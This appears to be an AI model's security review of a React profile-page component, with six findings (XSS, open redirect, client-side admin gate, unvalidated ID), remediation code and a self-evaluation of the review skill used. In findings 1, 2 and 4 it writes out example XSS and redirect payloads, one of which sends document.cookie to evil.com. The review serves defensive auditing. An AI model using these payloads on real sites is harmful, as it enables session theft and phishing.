# Security Review: 03-profile-page.tsx

## Reference Files Loaded

| File | Reason |
|---|---|
| **xss-breadth.md** | 3 uses of `dangerouslySetInnerHTML` + URL param rendered as HTML — core XSS surface. Trigger keywords: `dangerouslySetInnerHTML`, `innerHTML`, `raw` |
| **api-security-breadth.md** | Missing auth headers on all fetch calls, client-side admin gate, DELETE endpoint with no server-side auth, IDOR via user ID. Trigger keywords: `endpoint`, `auth`, `IDOR`, `rate limit` |
| **input-validation-breadth.md** | `userId` from query params used unsanitized in fetch URLs, no validation on comment input, redirect param unchecked. Trigger keywords: `validate`, `sanitize`, `parse` |

---

## Findings (ordered by severity)

### 1. CRITICAL — Reflected XSS via `dangerouslySetInnerHTML` on URL Parameter (CWE-79)

**Location:** `03-profile-page.tsx:51-54`, `03-profile-page.tsx:80-83`

```tsx
// Line 51-54: attacker-controlled query param
const msg = searchParams.get("welcome");
if (msg) setStatusMessage(msg);

// Line 80-83: rendered as raw HTML
<div className="status-banner"
     dangerouslySetInnerHTML={{ __html: statusMessage }} />
```

**Attack:** `?welcome=<img src=x onerror=alert(document.cookie)>` — instant script execution for anyone clicking the link. This is textbook reflected/DOM-based XSS per xss-breadth.md section 3.3 (DOM-Based XSS / innerHTML).

**Fix:** Remove `dangerouslySetInnerHTML` entirely. React auto-escapes JSX interpolation:
```tsx
{statusMessage && (
  <div className="status-banner">{statusMessage}</div>
)}
```

---

### 2. CRITICAL — Stored XSS via Comment Bodies (CWE-79)

**Location:** `03-profile-page.tsx:100`

```tsx
<div dangerouslySetInnerHTML={{ __html: c.body }} />
```

The UI explicitly encourages HTML input (line 108: `"Write a comment (HTML supported)..."`). Comment bodies from the API are rendered as raw HTML. An attacker stores `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` as a comment — every subsequent visitor executes it. Matches xss-breadth.md section 3.2 (Stored XSS — Database to Page Without Encoding) exactly.

**Fix:** Either render as plain text (`{c.body}`) or sanitize with DOMPurify:
```tsx
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(c.body, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href']
  })
}} />
```

---

### 3. CRITICAL — Stored XSS via User Bio (CWE-79)

**Location:** `03-profile-page.tsx:90`

```tsx
<div dangerouslySetInnerHTML={{ __html: profile.bio }} />
```

Same pattern as #2 but via the user profile bio field. If any user can set their own bio, they can inject arbitrary scripts that execute for every visitor to their profile. Apply the same DOMPurify sanitization or render as text.

---

### 4. HIGH — Open Redirect via `redirect` Query Parameter (CWE-601)

**Location:** `03-profile-page.tsx:71`

```tsx
window.location.href = searchParams.get("redirect") || "/";
```

An attacker crafts `?redirect=https://evil.com/phishing` and tricks an admin into clicking. After the delete action, the admin is redirected to a phishing page. Worse, `?redirect=javascript:alert(document.cookie)` is also viable, turning this into an XSS vector. This compounds with finding #5 — an attacker could trick an admin into deleting a user and getting phished in one click.

**Fix:** Validate the redirect is a safe relative path:
```tsx
const redirect = searchParams.get("redirect") || "/";
const safeRedirect = redirect.startsWith("/") && !redirect.startsWith("//")
  ? redirect
  : "/";
window.location.href = safeRedirect;
```

---

### 5. HIGH — Client-Side Only Authorization (CWE-862)

**Location:** `03-profile-page.tsx:12`, `03-profile-page.tsx:68-72`, `03-profile-page.tsx:114`

```tsx
const IS_ADMIN = true; // TODO: wire up to real permissions
// ...
{IS_ADMIN && (
  <button onClick={handleDeleteUser}>Delete User</button>
)}
```

The admin gate is a hardcoded client-side boolean. Any user can call the `DELETE /users/:id` endpoint directly via DevTools or curl. Per api-security-breadth.md section 9.1 (Missing Authentication on Endpoints), the admin delete endpoint example shows this exact anti-pattern — admin functionality without auth check.

Additionally, none of the `fetch()` calls include an `Authorization` header or credentials, so even if the server checks auth, the requests wouldn't pass (lines 39, 44, 58, 70).

**Fix:**
- Server must verify admin role on the `DELETE` endpoint
- Include auth tokens in all requests: `headers: { Authorization: \`Bearer ${token}\` }`
- Fetch admin status from authenticated session, not a client constant
- Add confirmation dialog before destructive actions

---

### 6. MEDIUM — Missing Input Validation on `userId` (CWE-20)

**Location:** `03-profile-page.tsx:35`, `03-profile-page.tsx:39`, `03-profile-page.tsx:44`, `03-profile-page.tsx:58`, `03-profile-page.tsx:70`

```tsx
const userId = searchParams.get("id");
fetch(`${API_BASE}/users/${userId}`)
```

`userId` from the `id` query parameter is used directly in API URL construction with no validation. If `userId` is `null`, fetches go to `/users/null`. If it contains path separators or encoded characters, it could manipulate the URL path. Per input-validation-breadth.md section 6.1 (Missing Server-Side Validation) and 6.2 (Improper Type Checking), all input must be validated for type and format.

**Fix:** Validate before making requests:
```tsx
const userId = searchParams.get("id");
if (!userId || !/^[a-zA-Z0-9-]+$/.test(userId)) {
  return <div>Invalid user ID</div>;
}
```

---

## Summary Table

| # | Severity | Issue | CWE | Line(s) |
|---|----------|-------|-----|---------|
| 1 | **Critical** | Reflected XSS via URL param + `dangerouslySetInnerHTML` | 79 | 51-54, 80-83 |
| 2 | **Critical** | Stored XSS via comment body | 79 | 100 |
| 3 | **Critical** | Stored XSS via user bio | 79 | 90 |
| 4 | **High** | Open redirect from query param | 601 | 71 |
| 5 | **High** | Client-side only admin authorization + missing auth headers | 862, 287 | 12, 39-70, 114 |
| 6 | **Medium** | Unvalidated userId interpolated into URL path | 20 | 35, 39 |

---
---

# Sec-Context Skill Evaluation

## Overall Verdict: Highly Useful

The sec-context skill meaningfully improved the quality, structure, and rigor of this security review. Below is a detailed evaluation.

---

## 1. How I Decided Which References to Load

The skill defines a routing table with **trigger keywords** per security surface. I scanned the code and matched:

| Code Pattern Found | Trigger Keywords Matched | Surface Selected |
|---|---|---|
| 3x `dangerouslySetInnerHTML` | `dangerouslySetInnerHTML`, `raw`, `innerHTML` | **XSS** |
| `fetch()` with no `Authorization` header, `IS_ADMIN = true` hardcoded, `DELETE` endpoint | `endpoint`, `auth`, `IDOR` | **API Security** |
| `searchParams.get("id")` used directly in URL, no format checks | `validate`, `sanitize`, `parse` | **Input Validation** |

I loaded **3 breadth files** and no depth files. The breadth files were sufficient because:
- The XSS patterns in this file are textbook cases (direct `dangerouslySetInnerHTML` with user input) — the breadth BAD examples covered them completely.
- The API security issues (missing auth, client-side admin gate) matched the breadth examples directly without needing edge-case analysis.
- Input validation issues were straightforward missing-validation patterns.

Surfaces I **did not load** (correctly):
- **Secrets & Credentials** — no API keys, passwords, or tokens hardcoded in the file
- **Cryptography** — no crypto operations
- **File Handling** — no file uploads or path operations
- **Dependencies** — no unusual package imports
- **Configuration & Deployment** — client-side component, not server config

This routing decision took about 10 seconds of scanning the code. The trigger keyword table made it mechanical rather than requiring judgment.

---

## 2. Pattern Matching Quality (BAD/GOOD Examples)

**Rating: Excellent**

Every finding mapped directly to a BAD example in the loaded references:

| Finding | Matched BAD Pattern |
|---|---|
| Reflected XSS (#1) | xss-breadth 3.1 (Reflected XSS) + 3.3 (DOM-Based XSS / innerHTML) |
| Stored XSS (#2, #3) | xss-breadth 3.2 (Stored XSS — Database to Page) |
| Open redirect (#4) | Identified via xss-breadth 3.5 URL context discussion |
| Client-side auth (#5) | api-security-breadth 9.1 (Missing Authentication — admin delete example) |
| Missing validation (#6) | input-validation-breadth 6.1 (Client-Side Only) + 6.2 (Type Checking) |

The GOOD examples provided **copy-paste-ready remediation** patterns:
- xss-breadth 3.3 GOOD: "Use DOMPurify.sanitize()" → directly became my fix for findings #2 and #3
- api-security-breadth 9.1 GOOD: auth middleware pattern → informed my fix for finding #5
- input-validation-breadth 6.2 GOOD: strict type validation → informed my fix for finding #6

This is the skill's greatest strength: the BAD/GOOD pairs make it trivial to (a) confirm a vulnerability matches a known pattern, and (b) generate a concrete fix rather than a vague recommendation.

---

## 3. Progressive Disclosure (Breadth vs Depth)

**Rating: Very Good**

For this file, breadth was sufficient. I did NOT need to load any depth files because:
- The vulnerabilities are classic, well-documented patterns (not edge cases)
- The code is a relatively simple React component (not a complex auth flow or crypto implementation)
- The BAD examples in breadth files matched the code patterns 1:1

The skill's instruction to "load breadth first, add depth only when doing a thorough review or when breadth is insufficient" saved significant context window budget. Loading 3 breadth files (~400 lines each = ~1200 lines) vs also loading depth files (~1100+ lines each) made a meaningful difference.

I **would** have loaded depth files if:
- The XSS patterns were more subtle (e.g., indirect data flow through multiple components)
- The auth patterns involved JWT or session management complexity
- The user explicitly asked for a "thorough" or "deep" review

---

## 4. What the Skill Caught That I Might Have Missed

- **Open redirect severity upgrade (#4):** The xss-breadth section 3.5 on URL context encoding reminded me that `javascript:` URIs work in `window.location.href`, upgrading the open redirect from a phishing vector to a potential XSS vector.
- **Compound vulnerability recognition (#4 + #5):** The api-security-breadth section 9.1 patterns helped me recognize that the open redirect inside the admin delete function is worse because the admin gate is client-side only — these two findings compound.
- **Structured severity classification:** The Quick Reference Table at the top of the skill provided consistent severity ratings (XSS = Critical, Missing Auth = Critical, Missing Validation = High) that I applied consistently rather than making ad-hoc judgments.

---

## 5. What the Skill Did NOT Help With

- **CWE-601 (Open Redirect)** is not in the Quick Reference Table. I identified it from general knowledge. The xss-breadth URL context section partially covers it, but open redirects are a distinct vulnerability class that deserves its own entry.
- **`javascript:` URI in `<a href>`:** The `profile.website` field rendered in `<a href={profile.website}>` could contain `javascript:alert(1)`. React does NOT block this. The xss-breadth file doesn't explicitly call out this React-specific pattern (it focuses on `innerHTML`/`dangerouslySetInnerHTML`). I noticed it but didn't include it as a separate finding to keep the review focused — in a depth review I would have.
- **Business logic concerns** (no confirmation dialog on delete, no soft-delete, no audit logging) are outside the skill's scope, which is correct.

---

## 6. Context Window Efficiency

**Rating: Good**

| What was loaded | Approximate lines |
|---|---|
| Skill SKILL.md | ~180 lines |
| xss-breadth.md | 393 lines |
| api-security-breadth.md | 1180 lines |
| input-validation-breadth.md | 753 lines |
| **Total** | **~2506 lines** |

This is a reasonable budget for a 122-line file review. The api-security-breadth.md is the largest file and covers 6 sub-patterns (9.1-9.6), of which I used 2 (9.1 and 9.2). The others (mass assignment, data exposure, rate limiting, error handling) weren't relevant but were loaded anyway.

**Suggestion:** If breadth files could be split per sub-section (e.g., `api-security-breadth-auth.md`, `api-security-breadth-idor.md`), context usage could be cut by ~50% for targeted reviews.

---

## Quantitative Summary

| Metric | Value |
|---|---|
| Total findings | 6 |
| Findings directly matched to a skill BAD pattern | 6/6 (100%) |
| Findings with skill-provided remediation template | 5/6 (83%) |
| Reference files loaded | 3 breadth files (0 depth) |
| Surfaces identified | 3 of 10 available |
| False positives from skill patterns | 0 |
| Findings the skill helped upgrade in severity | 1 (#4 open redirect → XSS via javascript:) |
| Findings I likely would have missed without the skill | 0 (but severity/remediation quality improved) |

---

## Final Assessment

| Dimension | Score (1-5) | Notes |
|---|---|---|
| **Routing / Surface Selection** | 5 | Trigger keywords mapped perfectly to code patterns; fast and mechanical |
| **Pattern Coverage** | 5 | Every vulnerability had a matching BAD/GOOD pair in breadth files |
| **Remediation Quality** | 5 | Concrete, copy-paste-ready fixes (DOMPurify config, auth middleware) |
| **Progressive Disclosure** | 5 | Breadth-only was sufficient; correctly avoided loading depth files |
| **Context Efficiency** | 3 | Breadth files are individually fine but api-security-breadth is large; could benefit from splitting |
| **Workflow Structure** | 4 | Clear and logical; could add "check vulnerability chains" step |
| **CWE/Severity Accuracy** | 4 | Solid coverage; CWE-601 (Open Redirect) missing from quick reference table |
| **Overall Usefulness** | **4.4/5** | The skill's primary value is in structured routing (which references to load), pattern matching (confirm/deny quickly), and remediation quality (concrete fixes). It turns security review from a "think of everything" exercise into a systematic checklist-driven process. |

**Bottom line:** The skill is well-designed for its stated purpose. For a file like this with classic vulnerability patterns, the breadth-only progressive disclosure was perfectly calibrated. The BAD/GOOD example pairs are the killer feature — they make vulnerability confirmation instant and remediation concrete rather than abstract.
